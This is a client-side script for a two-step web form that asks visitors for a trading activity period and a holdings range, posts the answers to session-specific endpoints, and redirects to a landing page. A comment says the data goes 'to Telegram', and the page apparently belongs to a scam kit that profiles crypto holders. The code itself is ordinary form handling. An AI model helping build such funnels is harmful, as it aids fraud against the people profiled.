<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Get session ID from URL
        const pathParts = window.location.pathname.split('/');
        const sessionId = pathParts[2];
        
        // Activity button click handler
        document.getElementById('activityButton').addEventListener('click', function() {
            // Get the first select element in the activity section
            const activitySelect = document.querySelector('#activity select');
            const errorDiv = document.getElementById('errorMessage');
            
            // Validate selection
            if (!activitySelect.value) {
                errorDiv.style.display = 'block';
                errorDiv.textContent = 'Please select an activity period';
                return;
            }
            
            // Clear error
            errorDiv.style.display = 'none';
            
            // Send activity data to Telegram
            const formData = new FormData();
            formData.append('activity_period', activitySelect.value);
            
            fetch(`/submit-activity/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    // Show holdings section
                    document.getElementById("activity").style.display = "none";
                    document.getElementById("holdings").style.display = "block";
                } else {
                    errorDiv.style.display = 'block';
                    errorDiv.textContent = 'Error: ' + (data.message || 'Unknown error');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                errorDiv.style.display = 'block';
                errorDiv.textContent = 'An error occurred. Please try again.';
            });
        });
        
        // Form submission handler
        document.getElementById('activityForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get the first select element in the holdings section
            const holdingsSelect = document.querySelector('#holdings select');
            const errorDiv = document.getElementById('errorMessage');
            const submitBtn = document.getElementById('holdingsButton');
            const submitText = document.getElementById('holdingsSubmit');
            
            // Validate selection
            if (!holdingsSelect.value) {
                errorDiv.style.display = 'block';
                errorDiv.textContent = 'Please select a holdings range';
                return;
            }
            
            // Show loading state
            submitBtn.disabled = true;
            submitText.textContent = 'Processing...';
            document.body.classList.add('loading');
            
            // Clear error
            errorDiv.style.display = 'none';
            
            // Submit form data
            const formData = new FormData(this);
            formData.append('holdings_range', holdingsSelect.value);
            
            fetch(`/submit-holdings/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                if (data.status === 'success') {
                    // Redirect to landing page
                    window.location.href = data.redirect;
                } else {
                    // Show error message
                    errorDiv.style.display = 'block';
                    errorDiv.textContent = 'Error: ' + (data.message || 'Unknown error');
                    submitBtn.disabled = false;
                    submitText.textContent = 'Continue';
                    document.body.classList.remove('loading');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                errorDiv.style.display = 'block';
                errorDiv.textContent = 'An error occurred. Please try again.';
                submitBtn.disabled = false;
                submitText.textContent = 'Continue';
                document.body.classList.remove('loading');
            });
        });
    });
</script>
